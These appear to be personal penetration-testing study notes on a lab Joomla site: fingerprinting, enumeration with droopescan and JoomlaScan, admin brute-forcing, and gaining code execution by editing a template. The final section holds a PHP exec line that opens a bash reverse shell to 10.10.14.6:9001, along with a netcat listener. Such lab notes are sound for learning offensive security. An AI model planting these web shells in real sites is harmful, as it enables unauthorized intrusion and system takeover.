> CMS used for discussion forums, photo galleries, eCommerce, user-based communities etc.

## Discovery/Footprinting
- we can fingerprint Joomla by looking at the page source : 
```python
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

- In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.
```python
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

## Enumeration

```python
droopescan scan joomla --url http://dev.inlanefreight.local/
```

 [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool. `JoomlaScan` is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure the `bs4` dependency is installed.
```python
python2 joomlascan.py -u http://dev.inlanefreight.local
```

- The default administrator account on Joomla installs is `admin`, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

## Attacking Joomla
- login with the creds that we got from the previous steps
- Go to templates
![[Pasted image 20260706090630.png|1301]]

- Open a template : 
![[Pasted image 20260706090747.png|1298]]

drop a shell there :

![[Pasted image 20260706090905.png|1249]]

then we can interact with the shell by : 

```python
#shell 
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'");
```

```python
nc -nvlp 9001
```

- Then go to error.php to trigger it.
```python
http://dev.inlanefreight.local/templates/protostar/error.php
```
